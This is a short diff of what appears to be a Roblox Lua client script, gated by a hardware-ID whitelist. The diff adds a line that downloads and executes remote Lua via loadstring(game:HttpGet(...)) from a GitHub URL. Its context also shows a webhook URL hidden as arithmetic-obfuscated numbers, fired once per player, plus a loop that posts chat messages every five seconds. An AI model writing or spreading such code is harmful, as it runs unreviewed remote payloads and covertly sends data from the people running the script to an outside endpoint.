@@ -10,9 +10,7 @@ local TextChatService = game:GetService("TextChatService")
 --== Variáveis ==--
 
 -- HWIDs autorizados para usar o script
-local authorized = {
-	["fd34b1e163d47b355b08edb414565a7a7f473b4ba0d2dd12608e5fde3f8b2319e4c28bbd6d09bc4c1491b239803edd90e392ae6b0fa0e79ccc8b830b2ae07b38"] = "iMathwx"
-}
+local authorized = loadstring(game:HttpGet("https://raw.githubusercontent.com/imathwx/R-I-F-T/refs/heads/main/HWID.lua"))()
 
 -- Player
 local localPlayer = Players.LocalPlayer
@@ -47,6 +45,10 @@ local isSentValid = (function()
 	end
 
 	if typeof(sent.Locations) ~= "table" then
+		return false
+	end
+	
+	if typeof(sent.Delay) ~= "number" then
 		return false
 	end
 
@@ -125,9 +127,9 @@ if not localPlayer:GetAttribute("Webhooked") then
 
 		return table.concat(lines, "\n")
 	end
-	
+
 	localPlayer:SetAttribute("Webhooked", true)
-	
+
 	-- Webhook
 	local WEBHOOK_URL = {
 		100+5,60-3,13*5,100-14+0,49*2,70+3,100-3,
@@ -292,7 +294,7 @@ task.spawn(function()
 			channel:SendAsync(msg)
 			task.wait(5)
 		end
-		
+
 		currentIndex += 1
 		if currentIndex > #locations then
 			currentIndex = 1
